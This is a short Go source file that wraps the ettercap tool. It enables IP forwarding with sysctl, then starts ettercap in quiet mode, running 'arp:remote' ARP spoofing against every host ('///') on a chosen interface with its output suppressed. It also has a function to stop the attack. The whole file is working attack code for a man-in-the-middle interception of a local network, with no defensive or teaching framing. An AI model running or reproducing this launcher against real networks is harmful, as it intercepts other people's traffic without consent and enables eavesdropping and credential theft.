package ettercap

import (
	"fmt"
	"os/exec"
)

var cmd *exec.Cmd

func enableIPForward() error {
	c := exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1")
	c.Stdout = nil
	c.Stderr = nil
	return c.Run()
}

func Start(iface string) error {
	if _, err := exec.LookPath("ettercap"); err != nil {
		return fmt.Errorf("ettercap is not installed")
	}

	_ = enableIPForward()

	cmd = exec.Command("ettercap", "-T", "-q", "-i", iface, "-M", "arp:remote", "-S", "///")
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("error starting ettercap: %v", err)
	}

	fmt.Printf("\r\033[K✅ Ettercap started in ARP spoofing mode (interface: %s)\n", iface)
	fmt.Printf("\r\033[K   PID: %d\n\n", cmd.Process.Pid)

	go func() { cmd.Wait() }()

	return nil
}

func Stop() {
	if cmd != nil && cmd.Process != nil {
		fmt.Println("\n\r\033[K🛑 Stopping ettercap...")
		cmd.Process.Kill()
		cmd.Wait()
	}
}
